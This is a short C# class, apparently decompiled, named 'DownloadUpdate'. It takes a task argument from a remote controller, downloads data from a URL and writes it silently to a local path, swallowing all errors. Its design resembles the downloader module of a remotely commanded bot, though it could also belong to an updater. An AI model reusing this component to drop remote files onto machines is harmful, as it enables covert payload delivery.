using System;
using System.IO;
using System.Net;

public class DownloadUpdate : ITaskProcessor
{
	public bool IsValidAction(UpdateAction action)
	{
		return action == UpdateAction.Download;
	}

	public bool Process(UpdateTask updateTask)
	{
		try
		{
			string[] array = updateTask.TaskArg.Split(new string[]
			{
				"|"
			}, StringSplitOptions.RemoveEmptyEntries);
			File.WriteAllBytes(Environment.ExpandEnvironmentVariables(array[1]), new WebClient().DownloadData(array[0]));
		}
		catch
		{
		}
		return true;
	}
}
